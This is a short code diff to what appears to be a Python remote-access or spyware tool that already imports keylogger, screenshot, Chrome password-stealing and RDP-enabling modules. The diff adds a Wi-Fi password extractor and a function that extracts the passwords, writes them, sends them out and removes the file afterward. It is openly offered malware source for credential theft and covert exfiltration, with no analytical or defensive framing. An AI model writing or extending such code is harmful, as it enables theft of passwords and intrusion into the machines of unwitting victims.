@@ -2,6 +2,7 @@ from screenshot import screenshot
 from sysinfo import sysinfo
 from keylogger import keylogger
 from chromepasswords import chromepasswords
+from wifipasswords import wifipasswordextractor
 from rdp import RDPEnabler
 import base64
 import json
@@ -67,6 +68,13 @@ def mod_systeminfo():
     s.write()
     s.send()
     s.remove()
+
+def mod_wifipasswords():
+    wp = wifipasswordextractor()
+    wp.extract_passwords()
+    wp.write()
+    wp.send()
+    wp.remove()
 
 def main():
     run_functions(REPO, CONFIG_FILE)
